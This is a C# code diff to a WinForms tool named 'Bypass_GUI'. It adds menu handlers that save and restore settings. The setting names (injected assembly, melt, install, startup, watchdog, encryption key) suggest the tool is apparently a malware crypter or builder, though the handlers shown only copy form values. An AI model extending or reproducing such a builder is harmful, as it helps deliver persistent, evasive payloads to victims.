@@ -61,5 +61,42 @@ namespace Bypass_GUI
                 
             }
         }
+
+        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Properties.Settings.Default.injAssembly = textBox1.Text;
+            Properties.Settings.Default.melt = checkedListBox1.GetItemChecked(1);
+            Properties.Settings.Default.install = checkedListBox1.GetItemChecked(2);
+            Properties.Settings.Default.startup = checkedListBox1.GetItemChecked(3);
+            Properties.Settings.Default.watchdog = checkedListBox1.GetItemChecked(4);
+            Properties.Settings.Default.encrypt = checkedListBox1.GetItemChecked(5);
+            Properties.Settings.Default.encryptionKey = textBox4.Text;
+            Properties.Settings.Default.watchdogKey = textBox5.Text;
+            Properties.Settings.Default.method = comboBox1.SelectedIndex;
+        }
+
+        private void openToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            textBox1.Text = Properties.Settings.Default.injAssembly;
+            checkedListBox1.SetItemChecked(1, Properties.Settings.Default.melt);
+            checkedListBox1.SetItemChecked(2, Properties.Settings.Default.install);
+            checkedListBox1.SetItemChecked(3, Properties.Settings.Default.startup);
+            checkedListBox1.SetItemChecked(4, Properties.Settings.Default.watchdog);
+            checkedListBox1.SetItemChecked(5, Properties.Settings.Default.encrypt);
+            textBox4.Text = Properties.Settings.Default.encryptionKey;
+            textBox5.Text = Properties.Settings.Default.watchdogKey;
+            comboBox1.SelectedIndex = Properties.Settings.Default.method;
+        }
+
+        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Close();
+        }
+
+        private void checkedListBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+           
+        }
     }
 }
